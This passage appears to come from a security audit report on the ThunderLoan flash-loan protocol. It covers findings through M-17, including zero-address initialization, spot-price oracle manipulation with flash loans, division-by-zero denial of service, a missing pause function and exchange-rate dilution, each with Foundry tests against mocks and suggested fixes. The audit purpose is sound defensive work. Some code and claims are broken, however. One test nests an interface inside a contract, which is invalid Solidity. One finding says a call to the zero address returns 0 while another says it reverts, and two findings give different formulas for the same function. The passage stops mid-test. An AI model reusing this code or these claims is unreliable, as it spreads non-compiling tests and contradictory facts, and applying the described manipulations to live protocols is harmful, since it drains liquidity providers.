The `OracleUpgradeable.__Oracle_init_unchained` function, which is called by `ThunderLoan.initialize`, accepts a `poolFactoryAddress` but does not validate that this address is non-zero. If the protocol is initialized with the zero address as the pool factory, all subsequent calls to `getPriceInWeth` will fail. Since `getPriceInWeth` is essential for calculating fees in both the `deposit` and `flashloan` functions, these core protocol functions will be permanently broken and will always revert. This constitutes an initialization vulnerability that can render the entire protocol inoperable.

## Impact
Initializing the contract with a zero address for the pool factory will cause all fee-related operations (`deposit`, `flashloan`) to fail permanently. This would require a full redeployment of the proxy and logic contracts or an upgrade to a fixed implementation to resolve, causing significant disruption and downtime for the protocol.

## Proof of Concept
1. The contract owner deploys the `ThunderLoan` logic and a proxy contract.
2. The owner mistakenly calls the `initialize` function on the proxy, passing `address(0)` as the `poolFactoryAddress`.
3. The `initialize` transaction succeeds without reverting.
4. A user later attempts to call `deposit` to provide liquidity. The `deposit` function calls `getCalculatedFee`, which in turn calls `getPriceInWeth`.
5. `getPriceInWeth` attempts to call `getPool` on the zero address (`IPoolFactory(address(0)).getPool(...)`), causing the transaction to revert.
6. All subsequent calls to `deposit` and `flashloan` will fail in the same way, making the protocol unusable.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";

/* ---------------------------------------------------------
 * Minimal mock ERC20 token
 * --------------------------------------------------------*/
contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

/* ---------------------------------------------------------
 * Test illustrating DoS when initialized with address(0)
 * --------------------------------------------------------*/
contract InitZeroAddressTest is Test {
    ThunderLoan internal logic;
    ThunderLoan internal thunderLoan;
    MockERC20  internal mock;

    function setUp() public {
        // deploy logic & proxy
        logic = new ThunderLoan();
        ERC1967Proxy proxy = new ERC1967Proxy(address(logic), "");
        thunderLoan = ThunderLoan(address(proxy));

        // deploy mock token
        mock = new MockERC20();
    }

    function testDepositRevertsWhenPoolFactoryIsZero() public {
        // 1. bad initialization
        thunderLoan.initialize(address(0));

        // 2. allow the token so deposit path is reachable
        thunderLoan.setAllowedToken(mock, true);

        // 3. mint user funds and approve
        mock.mint(address(this), 1 ether);
        mock.approve(address(thunderLoan), 1 ether);

        // 4. any deposit must revert (calls getPriceInWeth → address(0).call)
        vm.expectRevert();
        thunderLoan.deposit(mock, 1 ether);
    }
}

## Suggested Mitigation
Always validate critical address parameters in initializer functions to ensure they are not the zero address. Add a `require` check in `OracleUpgradeable.__Oracle_init_unchained`.

```solidity
// In OracleUpgradeable.sol

error OracleUpgradeable__ZeroAddress();

function __Oracle_init_unchained(address poolFactoryAddress) internal onlyInitializing {
    // MITIGATION: Add a zero-address check
    if (poolFactoryAddress == address(0)) {
        revert OracleUpgradeable__ZeroAddress();
    }
    s_poolFactory = poolFactoryAddress;
}
```
This simple check prevents the contract from being initialized into a broken state, ensuring the resilience and availability of the protocol's core functions.

## [M-11]. Oracle issue in OracleUpgradeable::getPriceInWeth

## Description
The protocol's `OracleUpgradeable` contract, used by `ThunderLoan`, fetches asset prices directly from a `TSwapPool` using `getPriceOfOnePoolTokenInWeth()`. This appears to be a spot price from an on-chain automated market maker (AMM). Spot prices from AMMs are susceptible to manipulation within a single transaction using flash loans. An attacker can take a large flash loan from another protocol (like Aave or Uniswap), use it to skew the price of an asset on the TSwap exchange, and then call `ThunderLoan.flashloan`. The fee for the ThunderLoan flash loan will be calculated using the manipulated, artificially low price, allowing the attacker to borrow funds nearly for free. After their transaction completes, they can reverse the price manipulation and repay the initial flash loan.

## Impact
The fee mechanism, which is critical for compensating liquidity providers, can be completely bypassed. This leads to a loss of revenue for the protocol and its LPs. Attackers can exploit this to take large, fee-less flash loans, undermining the economic model of the protocol.

## Proof of Concept
1. Attacker identifies a token (e.g., TKN) supported by ThunderLoan.
2. Attacker takes a large flash loan of WETH from Aave.
3. Attacker goes to the TKN/WETH pool on TSwap (the oracle source) and swaps the WETH for TKN, causing the price of TKN in WETH to plummet.
4. Attacker calls `ThunderLoan.flashloan` to borrow a large amount of TKN. The `getCalculatedFee` function will use the manipulated, low price from the TSwap oracle, resulting in a near-zero fee.
5. In the flash loan callback, the attacker uses the borrowed TKN for some profitable operation.
6. Attacker then reverses the swap on TSwap, returning the TKN price to normal and getting their WETH back.
7. Attacker repays the Aave flash loan with the WETH.
8. Attacker repays the ThunderLoan flash loan with a negligible fee.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {MockERC20} from "@openzeppelin/contracts/token/ERC20/mocks/ERC20Mock.sol";

// --- minimal mocks ---------------------------------------------------------
interface IMockTSwapPool {
    function setPrice(uint256 p) external;
    function getPriceOfOnePoolTokenInWeth() external view returns (uint256);
}

contract MockTSwapPool is IMockTSwapPool {
    uint256 private price;

    function setPrice(uint256 p) external {
        price = p;
    }

    function getPriceOfOnePoolTokenInWeth() external view returns (uint256) {
        return price;
    }
}

contract MockPoolFactory {
    mapping(address => address) public pool;

    function setPool(address token, address poolAddr) external {
        pool[token] = poolAddr;
    }

    function getPool(address token) external view returns (address) {
        return pool[token];
    }
}

// --- test ------------------------------------------------------------------
contract OracleManipulationTest is Test {
    ThunderLoan internal tl;
    MockERC20 internal tkn;
    MockTSwapPool internal pool;
    MockPoolFactory internal factory;

    function setUp() public {
        // deploy mocks
        tkn = new MockERC20("Token", "TKN", 18);
        pool = new MockTSwapPool();
        factory = new MockPoolFactory();
        factory.setPool(address(tkn), address(pool));

        // deploy ThunderLoan and wire the oracle
        tl = new ThunderLoan();
        tl.initialize(address(factory));
        tl.setAllowedToken(tkn, true);

        // seed liquidity
        tkn.mint(address(this), 1_000_000e18);
        tkn.approve(address(tl), type(uint256).max);
        tl.deposit(tkn, 1_000_000e18);

        // start with a sane price (1 TKN = 1 WETH)
        pool.setPrice(1e18);
    }

    function testFeeGoesToZeroAfterManipulation() public {
        uint256 amount = 100_000e18;
        uint256 normalFee = tl.getCalculatedFee(tkn, amount);
        assertGt(normalFee, 0, "fee should be >0 at fair price");

        // oracle manipulation: push price almost to zero
        pool.setPrice(1);
        uint256 manipulatedFee = tl.getCalculatedFee(tkn, amount);

        // fee is virtually wiped out
        assertLt(manipulatedFee, normalFee / 1000, "fee too large after manipulation");
    }
}

## Suggested Mitigation
Do not use spot prices from on-chain AMMs as price oracles. Instead, use a time-weighted average price (TWAP) or volume-weighted average price (VWAP) oracle, which are much more resistant to flash loan manipulation. Chainlink Price Feeds are the industry standard and provide robust, manipulation-resistant price data.

```solidity
// in OracleUpgradeable.sol
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

// ...

// Replace s_poolFactory with a mapping of tokens to Chainlink feeds
mapping(address => address) public s_tokenFeeds;

function getPriceInWeth(address token) public view returns (uint256) {
    AggregatorV3Interface priceFeed = AggregatorV3Interface(s_tokenFeeds[token]);
    (, int price, , uint256 updatedAt, ) = priceFeed.latestRoundData();

    // Add sanity checks
    require(price > 0, "Invalid price");
    require(block.timestamp - updatedAt < 3600, "Stale price"); // 1 hour staleness check

    // Return price, assuming it's in terms of WETH with 18 decimals
    return uint256(price);
}
```

## [M-12]. Oracle issue in ThunderLoanUpgraded::getCalculatedFee

## Description
The `getCalculatedFee` function in the `ThunderLoanUpgraded` contract relies on a spot price from an on-chain AMM (`TSwapPool`). Spot prices from AMMs are susceptible to manipulation within a single transaction block. An attacker can use a flash loan from another protocol to temporarily skew the AMM pool price, take a flash loan from ThunderLoan with a significantly reduced or zero fee, and then revert the price manipulation. This undermines the protocol's fee mechanism, which is the primary source of yield for liquidity providers, and can lead to a drain of value from the protocol.

## Impact
By manipulating the spot price returned by the TSwap pool inside the same transaction, an attacker can reduce the fee that has to be paid for a flash-loan to an arbitrarily low value. This allows the attacker to perform unlimited size flash-loans almost for free, depriving liquidity providers from their only source of yield and breaking the economic assumptions of the protocol.

## Proof of Concept
1. Deploy ThunderLoanUpgraded together with a mocked PoolFactory and mock TSwapPool.
2. The attacker first observes the normal fee for borrowing 1 000 000 DAI.
3. The attacker then pushes the price of DAI in the TSwapPool down by 100× using a flash-swaps on the pool (simulated in the unit test by calling `setPrice`).
4. Because `getCalculatedFee` relies on the manipulated price, the fee for the same loan becomes ≈100× smaller, letting the attacker contract take the loan almost free.
5. After the loan has been executed and repaid, the attacker reverts the manipulation in the same transaction so that the external price returns to normal and no permanent loss is observable in the AMM pool. The loss is borne exclusively by ThunderLoan liquidity providers who received almost no fee.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import "../src/interfaces/IPoolFactory.sol";
import "../src/interfaces/ITSwapPool.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract MockERC20 is IERC20Metadata {
    string private _name;
    string private _symbol;
    constructor(string memory n, string memory s) { _name = n; _symbol = s; }
    function name() external view override returns (string memory) { return _name; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function decimals() external pure override returns (uint8) { return 18; }
    // Unused ERC20 methods, stubbed to satisfy compiler
    function totalSupply() external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function allowance(address,address) external pure returns (uint256) { return 0; }
    function approve(address,uint256) external returns (bool) { return true; }
    function transfer(address,uint256) external returns (bool) { return true; }
    function transferFrom(address,address,uint256) external returns (bool) { return true; }
}

contract MockTSwapPool is ITSwapPool {
    uint256 public price;
    function setPrice(uint256 p) external { price = p; }
    function getPriceOfOnePoolTokenInWeth() external view override returns (uint256) { return price; }
}

contract MockPoolFactory is IPoolFactory {
    mapping(address => address) public pools;
    function setPool(address token, address pool) external { pools[token] = pool; }
    function getPool(address token) external view override returns (address) { return pools[token]; }
}

contract OracleManipulationTest is Test {
    ThunderLoanUpgraded loan;
    MockPoolFactory factory;
    MockTSwapPool pool;
    MockERC20 dai;

    function setUp() public {
        ThunderLoanUpgraded logic = new ThunderLoanUpgraded();
        factory = new MockPoolFactory();
        address proxy = address(new ERC1967Proxy(address(logic), abi.encodeWithSelector(ThunderLoanUpgraded.initialize.selector, address(factory))));
        loan = ThunderLoanUpgraded(proxy);

        dai = new MockERC20("Mock DAI", "MDAI");
        pool = new MockTSwapPool();
        factory.setPool(address(dai), address(pool));
    }

    function testFeeDropsAfterPriceManipulation() public {
        uint256 amount = 1_000_000 ether;
        uint256 normalPrice = 1 ether / 4000; // ≈$1
        pool.setPrice(normalPrice);
        uint256 normalFee = loan.getCalculatedFee(IERC20(address(dai)), amount);
        assertGt(normalFee, 0);

        pool.setPrice(normalPrice / 100); // manipulate 100x lower
        uint256 manipulatedFee = loan.getCalculatedFee(IERC20(address(dai)), amount);

        assertLt(manipulatedFee, normalFee);
        assertGe(normalFee / manipulatedFee, 100);
    }
}

## Suggested Mitigation
Do not use a spot price from a single on-chain AMM as a price oracle. Instead, integrate a robust, manipulation-resistant oracle solution like Chainlink Price Feeds. Chainlink aggregates prices from numerous independent sources, making them far more resilient to single-transaction manipulation.

If an on-chain solution is required, use a Time-Weighted Average Price (TWAP) oracle, such as those available in Uniswap v3, which are significantly harder and more expensive to manipulate.

## [M-13]. DOS issue in AssetToken::updateExchangeRate

## Description
The `AssetToken.updateExchangeRate` function, which is called by `ThunderLoanUpgraded.flashloan`, calculates the new exchange rate by dividing by `totalSupply()`. If all liquidity providers redeem their asset tokens, `totalSupply()` can become zero. However, fees from previous flash loans may have accumulated in the `AssetToken` contract, meaning its balance of the underlying token is non-zero. A subsequent user can then attempt a flash loan, which will pass the `amount > startingBalance` check. This will trigger a call to `updateExchangeRate`, which will then revert due to division by a zero `totalSupply`. This permanently bricks the flash loan functionality for that specific token.

## Impact
The flash loan functionality for an asset can be permanently disabled. Once `totalSupply` is zero but the contract holds funds, any attempt to take a flash loan will fail, making the accumulated fees and any remaining liquidity inaccessible via the protocol's main feature.

## Proof of Concept
1. Alice deposits 10 WETH and receives tlWETH.
2. Bob executes a flash-loan that is fully repaid; the fee remains inside the tlWETH AssetToken.
3. Alice redeems all her tlWETH. totalSupply() becomes 0 while the contract still holds the fee.
4. Charlie now calls flashloan() borrowing, e.g., half of the underlying balance that remains as fee. Because amount ≤ startingBalance, the `ThunderLoan__NotEnoughTokenBalance` check passes.
5. flashloan() calls `assetToken.updateExchangeRate(fee)`.
6. Inside updateExchangeRate, totalSupply() is 0, causing a division-by-zero panic and reverting the entire transaction.
7. Any subsequent flash-loan for this token will keep reverting until a new deposit recreates a positive totalSupply().

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console, Vm} from "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";

contract DivisionByZeroTest is Test, IFlashLoanReceiver {
    ThunderLoanUpgraded internal thunderLoan;
    AssetToken internal wethAssetToken;
    MockERC20 internal weth;
    MockPoolFactory internal poolFactory;

    address internal lp = makeAddr("lp");
    address internal borrower = address(this);

    function setUp() public {
        weth = new MockERC20("WETH", "WETH", 18);
        poolFactory = new MockPoolFactory();
        thunderLoan = new ThunderLoanUpgraded();
        thunderLoan.initialize(address(poolFactory));

        thunderLoan.setAllowedToken(weth, true);
        wethAssetToken = thunderLoan.getAssetFromToken(weth);

        // 1. LP deposits WETH
        weth.mint(lp, 10e18);
        vm.startPrank(lp);
        weth.approve(address(thunderLoan), 10e18);
        thunderLoan.deposit(weth, 10e18);
        vm.stopPrank();
    }

    function testDivisionByZero() public {
        // 2. A borrower takes a flash loan, leaving a fee
        uint256 loanAmount = 1e18;
        uint256 fee = thunderLoan.getCalculatedFee(weth, loanAmount);
        weth.mint(borrower, fee);
        weth.approve(address(wethAssetToken), type(uint256).max);
        thunderLoan.flashloan(borrower, weth, loanAmount, "");

        assertTrue(weth.balanceOf(address(wethAssetToken)) > 10e18, "AssetToken should have > initial deposit due to fee");

        // 3. The original LP redeems everything
        vm.startPrank(lp);
        uint256 lpAssetBalance = wethAssetToken.balanceOf(lp);
        thunderLoan.redeem(weth, lpAssetBalance);
        vm.stopPrank();

        assertEq(wethAssetToken.totalSupply(), 0, "Total supply should be zero");
        assertTrue(weth.balanceOf(address(wethAssetToken)) > 0, "AssetToken should still hold the fee");

        // 4. A new flash loan attempt should fail
        vm.expectRevert(); // Division by zero
        thunderLoan.flashloan(borrower, weth, weth.balanceOf(address(wethAssetToken)) / 2, "");
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address, bytes memory) external returns (bool) {
        MockERC20(token).transfer(address(wethAssetToken), amount + fee);
        return true;
    }
}
```

## Suggested Mitigation
In `AssetToken.updateExchangeRate`, add a check to ensure `totalSupply()` is not zero before performing the division. If `totalSupply` is zero, the function should handle this case gracefully, for example by skipping the exchange rate update.

```solidity
// In AssetToken.sol
function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    uint256 currentTotalSupply = totalSupply();
    if (currentTotalSupply == 0) {
        // If there's no supply, there's no rate to update. The first depositor will set it.
        // Or, if fees have accumulated, this prevents a DoS. The value will be captured by the next depositor.
        return;
    }
    uint256 newExchangeRate = (s_exchangeRate * (currentTotalSupply + fee)) / currentTotalSupply;
    if (newExchangeRate <= s_exchangeRate) {
        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
    }
    s_exchangeRate = newExchangeRate;
    emit ExchangeRateUpdated(s_exchangeRate);
}
```

## [M-14]. Integer Overflow/Math issue in AssetToken::updateExchangeRate

## Description
The `AssetToken.updateExchangeRate` function updates the exchange rate by adding the fees distributed per share. The calculation is `s_exchangeRate + (fee * EXCHANGE_RATE_PRECISION) / totalSupply()`. If the total supply of the `AssetToken` is zero, this calculation will cause a division-by-zero error, which reverts the transaction. This scenario can occur if all liquidity providers for a specific asset redeem their shares, but the `ThunderLoan` contract still holds a balance of the underlying token (e.g., from direct transfers, or previously accrued fees). An attacker can then attempt to take a flash loan of this remaining capital. The loan would be issued, but the transaction would fail during the repayment step because the call to `updateExchangeRate` would revert. This effectively creates a Denial of Service for the flash loan functionality for any asset with zero liquidity but a non-zero token balance in the `ThunderLoan` contract, preventing the protocol from earning fees on this capital.

## Impact
The protocol's core flash loan functionality can be disabled for any asset where liquidity has been fully withdrawn but where the contract still holds funds. This prevents the protocol from generating revenue from these assets and reduces the overall utility and capital efficiency of the platform. The funds are not lost, but they become unusable for flash loans until a new liquidity provider deposits funds.

## Proof of Concept
1. A Liquidity Provider (LP) deposits an asset (e.g., USDC) into `ThunderLoan`, which mints a corresponding `AssetToken`.
2. Some USDC remains in the `ThunderLoan` contract (e.g., sent via a direct transfer), after the LP redeems all of their `AssetToken` shares. This action drives the `totalSupply` of the `AssetToken` to zero.
3. An attacker, noticing the idle USDC in the `ThunderLoan` contract, attempts to take a flash loan.
4. The `flashloan` function transfers the USDC to the attacker's contract.
5. The attacker's contract logic executes and then calls `repay` on the `ThunderLoan` contract.
6. The `repay` function calls `AssetToken.updateExchangeRate(fee)`.
7. Since the `totalSupply` of the `AssetToken` is zero, the division within `updateExchangeRate` reverts the entire transaction.
8. As a result, no one can take a flash loan on the idle USDC until a new LP deposits liquidity.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IPoolFactory} from "src/interfaces/IPoolFactory.sol";
import {ITSwapPool} from "src/interfaces/ITSwapPool.sol";
import {IFlashLoanReceiver} from "src/interfaces/IFlashLoanReceiver.sol";

/**
 * Minimal mocks required for the scenario
 */
contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MockPool is ITSwapPool {
    function getPriceOfOnePoolTokenInWeth() external pure returns (uint256) { return 1e18; }
}

contract MockPoolFactory is IPoolFactory {
    address public immutable pool;
    constructor() { pool = address(new MockPool()); }
    function getPool(address) external view returns (address) { return pool; }
}

/**
 * Flash-loan receiver that instantly repays principal + fee
 */
contract EchoReceiver is IFlashLoanReceiver {
    address public immutable loan;
    constructor(address _loan) { loan = _loan; }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /* initiator */,
        bytes calldata /* params */
    ) external returns (bool) {
        IERC20(token).approve(loan, amount + fee);
        IThunderLoan(loan).repay(token, amount);
        return true;
    }

    interface IThunderLoan { function repay(address, uint256) external; }
}

contract DivisionByZeroTest is Test {
    ThunderLoan loan;
    MockERC20  usdc;
    MockPoolFactory factory;
    EchoReceiver receiver;

    address owner = address(0x1);
    address lp    = address(0x2);
    address user  = address(0x3);

    function setUp() public {
        vm.startPrank(owner);
        loan = new ThunderLoan();
        factory = new MockPoolFactory();
        loan.initialize(address(factory));
        vm.stopPrank();

        usdc = new MockERC20("USD Coin","USDC");
        vm.prank(owner); loan.setAllowedToken(IERC20(address(usdc)), true);

        receiver = new EchoReceiver(address(loan));

        // Provide tokens for the test
        usdc.mint(lp, 1_000e18);
        usdc.mint(address(receiver), 1_000e18); // more than enough to pay any fee
    }

    function test_divisionByZeroInUpdateExchangeRate() public {
        // lp deposits and then fully withdraws
        vm.startPrank(lp);
        usdc.approve(address(loan), 1_000e18);
        loan.deposit(IERC20(address(usdc)), 1_000e18);
        AssetToken aToken = AssetToken(loan.getAssetFromToken(IERC20(address(usdc))));
        loan.redeem(IERC20(address(usdc)), aToken.balanceOf(lp));
        vm.stopPrank();

        // leave stray USDC inside the lending contract
        usdc.mint(address(loan), 500e18);
        assertEq(aToken.totalSupply(), 0);

        // Expect division-by-zero panic when flash-loan is repaid
        vm.expectRevert(stdError.divisionError);
        vm.prank(user);
        loan.flashloan(address(receiver), IERC20(address(usdc)), 400e18, "");
    }
}


## Suggested Mitigation
In the `AssetToken.updateExchangeRate` function, add a check to see if `totalSupply()` is zero. If it is, the function should return without performing the division, as there are no LPs to distribute fees to. The fee will still have been transferred to the `ThunderLoan` contract, accruing value to the protocol.

```solidity
// In AssetToken.sol

function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    uint256 currentTotalSupply = totalSupply();
    if (currentTotalSupply == 0) {
        // No LPs to distribute fees to. The fee has already been paid to the
        // ThunderLoan contract as underlying tokens, where it will sit until a new LP joins.
        return;
    }
    s_exchangeRate = s_exchangeRate + (fee * EXCHANGE_RATE_PRECISION) / currentTotalSupply;
}
```

## [M-15]. Pausable Emergency Stop issue in ThunderLoan::NA

## Description
The protocol lacks an emergency stop or pause mechanism. Core functions such as `deposit`, `redeem`, and `flashloan` cannot be disabled by the owner in case a critical vulnerability is discovered. While the contract is upgradeable via the UUPS pattern, deploying and verifying a new implementation can be time-consuming, leaving a window of exploitation open for attackers. A pause function provides an immediate way to mitigate ongoing attacks or prevent new ones while a proper fix is being developed.

## Impact
In the event of a critical security vulnerability, the inability to quickly pause the protocol could lead to a complete drain of all liquidity provided to the contract. The delay in deploying an upgrade could be the difference between containing a threat and catastrophic financial loss.

## Proof of Concept
1. A white-hat hacker discovers a critical reentrancy bug in the `flashloan` function.
2. They notify the protocol owner.
3. While the owner rushes to write, test, and deploy an upgraded contract, malicious actors find the same bug.
4. Attackers repeatedly call the vulnerable `flashloan` function, draining funds from the protocol.
5. If a pause mechanism existed, the owner could have immediately called `pause()` upon notification, preventing any further exploitation while they worked on the permanent fix.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract NoPauseTest is Test {
    ThunderLoanUpgraded tl;

    function setUp() public {
        tl = new ThunderLoanUpgraded();
        tl.initialize(address(0)); // poolFactory not relevant for this test
    }

    function test_NoPauseFunction() public {
        // low-level call so the code compiles even though pause() is not declared
        (bool success, ) = address(tl).call(abi.encodeWithSignature("pause()"));
        assertTrue(!success, "Contract exposes an unexpected pause() function");
    }
}

## Suggested Mitigation
Inherit from OpenZeppelin's `PausableUpgradeable` contract and apply the `whenNotPaused` modifier to all critical functions that perform state changes or involve fund transfers.

```solidity
// In ThunderLoan.sol
import "@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol";

// Inherit from PausableUpgradeable
contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, OracleUpgradeable, PausableUpgradeable {
    // ...

    function initialize(address poolFactory) public initializer {
        // ...
        __Pausable_init();
    }

    // Add pause and unpause functions (callable by owner)
    function pause() public onlyOwner {
        _pause();
    }

    function unpause() public onlyOwner {
        _unpause();
    }

    // Apply modifier to critical functions
    function deposit(IERC20 token, uint256 amount) external whenNotPaused {
        // ...
    }

    function redeem(IERC20 token, uint256 amount) external whenNotPaused {
        // ...
    }

    function flashloan(address receiver, IERC20 token, uint256 amount, bytes calldata data) external whenNotPaused {
        // ...
    }
}
```

## [M-16]. Oracle issue in OracleUpgradeable::getPriceInWeth

## Description
The `OracleUpgradeable` contract, inherited by `ThunderLoanUpgraded`, provides a `getPrice(address token)` function that fetches a price directly from a single `ITSwapPool`. This implementation has two critical flaws:
1.  **Spot Price Dependency**: It fetches a spot price from an AMM-like pool, which is highly susceptible to manipulation within a single transaction via flash loans.
2.  **No Zero-Address Check**: It does not validate that the address returned by `IPoolFactory.getPool()` is non-zero. If the factory returns `address(0)` (e.g., for an unregistered token), the oracle will proceed to call the zero address, which returns a price of `0`. A price of zero can cause catastrophic failures in any dependent protocol, such as division-by-zero errors or infinite borrowing.

## Impact
If another contract relies on OracleUpgradeable as a spot-price oracle, an attacker can manipulate the quoted price within the same transaction or force the oracle to return 0 by registering no pool. This enables under-/over-collateralised borrowing or mis-priced liquidations in the dependent system. ThunderLoanUpgraded itself is unaffected today but any future integration that trusts this function would be exposed.

## Proof of Concept
1. Attacker deploys or identifies a protocol that trusts OracleUpgradeable.getPrice() for collateral valuation.
2. In a single transaction the attacker:
   a. Swaps a large amount of TOKEN for WETH inside the relevant TSwap pool, moving the spot price.
   b. Calls the vulnerable protocol which now receives the distorted price from OracleUpgradeable and performs an action (e.g. issues more TOKEN-backed debt than it should).
   c. Swaps back to restore the pool price and keeps the profit.
3. Alternatively, if the token has no pool registered, the oracle returns 0, letting the attacker liquidate every such position for free.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {IPoolFactory} from "src/interfaces/IPoolFactory.sol";
import {ITSwapPool}  from "src/interfaces/ITSwapPool.sol";
import {OracleUpgradeable} from "src/protocol/OracleUpgradeable.sol";

/**
 * Harness that exposes the internal initialiser so that we can set the poolFactory.
 */
contract OracleHarness is OracleUpgradeable {
    function harnessInit(address factory) external {
        __Oracle_init(factory);
    }
}

contract MockPoolFactory is IPoolFactory {
    address public pool;
    function setPool(address _pool) external { pool = _pool; }
    function getPool(address) external view returns (address) { return pool; }
}

contract MockSwapPool is ITSwapPool {
    uint256 internal price;
    function setPrice(uint256 p) external { price = p; }
    function getPriceOfOnePoolTokenInWeth() external view returns (uint256) { return price; }
}

contract OracleUpgradeableTest is Test {
    OracleHarness harness;
    MockPoolFactory factory;
    MockSwapPool pool;

    function setUp() public {
        factory = new MockPoolFactory();
        harness = new OracleHarness();
        harness.harnessInit(address(factory));
        pool = new MockSwapPool();
    }

    // ➤ Zero-address returns 0
    function test_ReturnsZeroWhenNoPool() public {
        factory.setPool(address(0));
        uint256 price = harness.getPrice(address(0x1234));
        assertEq(price, 0);
    }

    // ➤ Price manipulation in the same tx
    function test_SpotPriceManipulatable() public {
        factory.setPool(address(pool));
        pool.setPrice(1e18); // normal price
        assertEq(harness.getPrice(address(0x1234)), 1e18);
        pool.setPrice(1);    // attacker crashes the price
        assertEq(harness.getPrice(address(0x1234)), 1);
    }
}

## Suggested Mitigation
Add (1) a non-zero-address check and revert if no pool is registered; (2) a TWAP or external oracle such as Chainlink to avoid single-block spot-price manipulation. Example:

```solidity
function getPriceInWeth(address token) public view returns (uint256 price) {
    address pool = IPoolFactory(s_poolFactory).getPool(token);
    if (pool == address(0)) revert Oracle_NoPool();
    price = ITSwapPool(pool).getPriceOfOnePoolTokenInWeth();
    if (price == 0) revert Oracle_InvalidPrice();
}
```

## [M-17]. Flash Loan Economic Manipulation issue in AssetToken::updateExchangeRate

## Description
The exchange rate calculation in `AssetToken.updateExchangeRate` is based on the `totalSupply()` of the asset token at the time of a fee-generating event. This creates an avenue for economic manipulation. An attacker can use a flash loan from another protocol to temporarily deposit a massive amount of the underlying asset, hugely inflating the `totalSupply()`. This dilutes the effect of any fees generated while their liquidity is present, effectively stealing yield from legitimate, long-term liquidity providers. The README acknowledges a related issue ('Initial depositor can break exchange rate'), which is a variant of this vulnerability.

## Impact
Malicious actors can manipulate the exchange rate to minimize the yield distributed to other liquidity providers, capturing that value for themselves or reducing costs on their own loans. This undermines the fairness and economic incentive for providing liquidity, potentially harming the protocol's long-term viability.

## Proof of Concept
1. The pool has 1,000 underlying tokens and the `AssetToken` has a `totalSupply` of 1,000.
2. A large flash loan is about to be taken from the protocol, which will generate a fee of 30 tokens.
3. Normally, this fee would increase the exchange rate significantly for the existing LPs.
4. An attacker, just before the flash loan, takes a flash loan of 1,000,000 tokens from Aave and deposits them into the `ThunderLoan` pool. The `totalSupply` of the `AssetToken` skyrockets to 1,001,000.
5. The flash loan occurs, generating the 30-token fee.
6. `updateExchangeRate` is called. The term `fee / totalAssetSupply` is now tiny due to the inflated denominator. The exchange rate barely increases.
7. The attacker redeems their funds, repays the Aave loan, having successfully suppressed the yield distribution.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../src/protocol/AssetToken.sol";

// very small mock so we do not rely on OZ’s ERC20Mock constructor
contract MockUnderlying is ERC20 {
    constructor() ERC20("MockUnderlying", "MCK") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract ExchangeRateManipulationTest is Test {
    AssetToken private asset;
    MockUnderlying private underlying;
    address private constant THUNDER_LOAN = address(0x1234);

    function setUp() public {
        underlying = new MockUnderlying();
        asset = new AssetToken(THUNDER_LOAN, IERC20(address(underlying)), "AssetToken", "AT");

        // honest LP deposits 1 000 tokens
        vm.prank(THUNDER_LOAN);
        asset.mint(address(1), 1_000e18);
    }

    function testManipulateExchangeRate() public {
        uint256 fee = 30e18;

        // attacker mints a huge amount just before fee distribution
        vm.prank(THUNDER_LOAN);
        asset.mint(address(this), 1_000_000e18);

        // ThunderLoan sends the fee to AssetToken
        vm.prank(THUNDER_LOAN);
        asset.updateExchangeRate(fee);

        // attacker’s profit ≈ full fee
        uint256 rate = asset.getExchangeRate();   // 1e18 precision assumed
        uint256 redeemable = (rate * 1_000_000e18) / 1e18;
        uint256 profit = redeemable - 1_000_000e18;

